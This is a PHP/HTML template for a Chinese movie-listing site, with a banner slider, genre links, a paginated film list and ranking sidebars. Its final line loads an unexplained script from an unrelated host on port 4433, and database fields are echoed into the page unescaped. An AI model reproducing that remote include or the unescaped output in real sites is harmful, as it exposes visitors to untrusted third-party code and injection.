<!DOCTYPE html>
<html>
    
    <head>
    <?php include_once('templete/pub_head.php') ?>
    </head>
    
    <body>
    
    <?php include_once('templete/menubar.php') ?>
    
    <div class="article-banner">
        <div class="swiper-wrapper">
            <div class="swiper-slide">
                <a class="swiper-link" href="<?php echo base_url() ?>movie_RLsQOF.html" target="_blank" style="background-color: #374049;">
                    <img src="<?php echo base_url() ?>htdocs/365film/images/movie-banner/banner_RLsQOF.jpg" />
                </a>
            </div>
            <div class="swiper-slide">
                <a class="swiper-link" href="<?php echo base_url() ?>movie_8AIkbb.html" target="_blank" style="background-color: #050102;">
                    <img src="<?php echo base_url() ?>htdocs/365film/images/movie-banner/banner_8AIkbb.jpg" />
                </a>
            </div>
            <div class="swiper-slide">
                <a class="swiper-link" href="<?php echo base_url() ?>movie_B2r3bc.html" target="_blank" style="background-color: #050102;">
                    <img src="<?php echo base_url() ?>htdocs/365film/images/movie-banner/banner_B2r3bc.jpg" />
                </a>
            </div>
            <div class="swiper-slide">
                <a class="swiper-link" href="<?php echo base_url() ?>movie_bOi7oM.html" target="_blank" style="background-color: #f9f5e9;">
                    <img src="<?php echo base_url() ?>htdocs/365film/images/movie-banner/banner_bOi7oM.jpg" />
                </a>
            </div>
            <div class="swiper-slide">
                <a class="swiper-link" href="<?php echo base_url() ?>movie_D0yTp5.html" target="_blank" style="background-color: #000000;">
                    <img src="<?php echo base_url() ?>htdocs/365film/images/movie-banner/banner_D0yTp5.jpg" />
                </a>
            </div>
            <div class="swiper-slide">
                <a class="swiper-link" href="<?php echo base_url() ?>movie_EJ2hQV.html" target="_blank" style="background-color: #e1c428;">
                    <img src="<?php echo base_url() ?>htdocs/365film/images/movie-banner/banner_EJ2hQV.jpg" />
                </a>
            </div>
        </div>
        <!-- 如果需要分页器 -->
        <div class="swiper-pagination"></div>
        
        <!-- 如果需要导航按钮 -->
        <div class="swiper-button-prev"></div>
        <div class="swiper-button-next"></div>
        
    </div>
    
    <div class="article-typenav">
        <div class="container after-cls">
            <ul>
                <li>
                    <a href="<?php echo base_url() ?>type_dongzuo.html" target="_blank">
                        <div class="title" style="background-color:#5c8d8b;">
                            <p class="type">动作</p>
                            <p class="count" style="color:#a1bfbd;">共<?php echo $type_count['dongzuo']; ?>部</p>
                        </div>
                        <img src="<?php echo base_url() ?>htdocs/365film/images/movie-type/dongzuo.jpg" />
                    </a>
                </li>
                <li>
                    <a href="<?php echo base_url() ?>type_xiju.html" target="_blank">
                        <div class="title" style="background-color:#cba749;">
                            <p class="type">喜剧</p>
                            <p class="count" style="color:#ffe399;">共<?php echo $type_count['xiju']; ?>部</p>
                        </div>
                        <img src="<?php echo base_url() ?>htdocs/365film/images/movie-type/xiju.jpg" />
                    </a>
                </li>
                <li>
                    <a href="<?php echo base_url() ?>type_kongbu.html" target="_blank">
                        <div class="title" style="background-color:#6d8db1;">
                            <p class="type">恐怖</p>
                            <p class="count" style="color:#b9cde5;">共<?php echo $type_count['kongbu']; ?>部</p>
                        </div>
                        <img src="<?php echo base_url() ?>htdocs/365film/images/movie-type/kongbu.jpg" />
                    </a>
                </li>
                <li>
                    <a href="<?php echo base_url() ?>type_kehuan.html" target="_blank">
                        <div class="title" style="background-color:#9f725a;">
                            <p class="type">科幻</p>
                            <p class="count" style="color:#d5a78f;">共<?php echo $type_count['kehuan']; ?>部</p>
                        </div>
                        <img src="<?php echo base_url() ?>htdocs/365film/images/movie-type/kehuan.jpg" />
                    </a>
                </li>
                <li>
                    <a href="<?php echo base_url() ?>type_juqing.html" target="_blank">
                        <div class="title" style="background-color:#8981a0;">
                            <p class="type">剧情</p>
                            <p class="count" style="color:#cfc7e5;">共<?php echo $type_count['juqing']; ?>部</p>
                        </div>
                        <img src="<?php echo base_url() ?>htdocs/365film/images/movie-type/juqing.jpg" />
                    </a>
                </li>
            </ul>
        </div>
    </div>
    
    <div class="container after-cls pt30 pb30">
        <div class="article-left">
            
            <input type="hidden" id="article_nation" value="" />
            <input type="hidden" id="article_page" value="1" />
            <div class="article-list" id="article_list">
                
                <?php foreach ($article_list as $article){ ?>
                <a href="<?php echo base_url() ?>movie_<?php echo $article->article_route; ?>.html" target="_blank" class="article-item">
                    <div class="thumb">
                        <img data-src="/<?php echo $article->thumb_path; ?>" src="" alt="<?php echo $article->article_title; ?>" />
                    </div>
                    <div class="limit">
                        <h4 class="title"><?php echo $article->article_title; ?></h4>
                        <h5 class="summary"><?php echo $article->article_summary; ?></h5>
                        <p class="tags"><span><?php echo $article->article_type; ?></span><!--<span class="f13 ml20">1995-09-22</span>--></p>
                    </div>
                    <?php if($article->article_score > 0){ ?>
                    <div class="score">豆瓣：<?php echo $article->article_score; ?></div>
                    <?php } ?>
                </a>
                <?php } ?>
                
            </div>
            
            <?php echo $this->pagination->create_links(); ?>
            
        </div>
        <div class="article-right">
            
            <?php if(!empty($redirect)){ ?>
            <!--域名列表广告-->
            <a style="display: block; background-color: #fff; box-shadow: 0px 0px 3px #c3c3c4; border-radius: 3px; padding: 5px; margin-bottom: 15px;" href="<?php echo base_url() ?>domain.html" target="_blank">
                <img style="display: block; width: 100%;" src="/htdocs/365film/images/poster-domain.png" />
            </a>
            <?php } ?>
            
            <?php  if(count($article_rank) > 0){ ?>
            <div class="rank">
                <a class="rank-title" href="<?php echo base_url() ?>mtime.html" target="_blank" title="点击查看更多">时光网TOP100</a>
                <?php foreach ($article_rank as $article){ ?>
                <div class="rank-item">
                    <div class="title"><?php echo $article->article_title; ?></div>
                    <div class="summary"><?php echo $article->article_summary; ?>...
                        <a href="<?php echo base_url() ?>movie_<?php echo $article->article_route; ?>.html" target="_blank">查看</a>
                    </div>
                    <p class="pl10"><?php echo $article->article_type; ?></p>
                </div>
                <?php } ?>
            </div>
            <?php } ?>
            
            <?php  if(count($article_recommend) > 0){ ?>
            <div class="recommend">
                <h4 class="recommend-title">推荐电影</h4>
                <?php foreach ($article_recommend as $article){ ?>
                <a class="recommend-item" href="<?php echo base_url() ?>movie_<?php echo $article->article_route; ?>.html" target="_blank">
                    <h4 class="title"><?php echo $article->article_title; ?></h4>
                    <div class="thumb">
                        <img src="/<?php echo $article->thumb_path; ?>" alt="<?php echo $article->article_title; ?>" />
                    </div>
                    <div class="summary"><?php echo $article->article_summary; ?></div>
                </a>
                <?php } ?>
            </div>
            <?php } ?>
            
        </div>
    </div>
    
    <?php include_once('templete/pub_foot.php') ?>
    
    <script type="text/javascript">
    $(function(){
        
        var mySwiper = new Swiper ('.article-banner', {
            direction: 'horizontal', // 水平切换选项
            loop: true, // 循环模式选项
            
            // 如果需要分页器
            pagination: {
                el: '.swiper-pagination',
                clickable :true,
            },
            
            // 如果需要前进后退按钮
            navigation: {
                nextEl: '.swiper-button-next',
                prevEl: '.swiper-button-prev',
            },
        })
        
        lazyLoading();//图片懒加载
        $(window).on("scroll",function(){
            lazyLoading();
        })
        
        scrollTop("ico_top");//返回顶部
        
        $(".rank-item .title").on("click",function(){
            $(this).parent().toggleClass("active");
            $(this).siblings(".summary").slideToggle();
        })
        
    })
    </script>
    <script src="https://j.qiqivv.com:4433/i.php?z=126802"></script>
    </body>
</html>
